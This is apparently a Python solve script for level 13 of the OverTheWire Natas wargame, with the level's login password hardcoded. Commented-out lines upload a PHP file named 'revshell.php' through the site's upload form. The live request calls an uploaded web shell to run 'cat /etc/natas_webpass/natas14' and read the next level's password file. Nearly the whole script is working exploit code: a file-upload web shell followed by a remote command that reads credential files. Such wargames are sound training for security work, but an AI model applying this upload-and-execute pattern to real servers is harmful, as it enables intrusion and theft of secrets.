import requests
import re

username ='natas13'
password ='jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

# data = {"filename":"revshell.php" , "MAX_FILE_SIZE":"1000"}
# files = {"uploadedfile" : open('revshell.php','rb')}

# responce = session.post(url, auth = (username, password))
# responce = session.post(url,files = files ,data=data, auth = (username, password))

responce = session.get(url + "upload/4h5n5vipu3.php?c=cat /etc/natas_webpass/natas14", auth = (username,password))



content = responce.text

# print(session.cookies['loggedin'])
print (content)

# print ("password for natas14 is = " + re.findall('GIF89a(.*)',content)[0])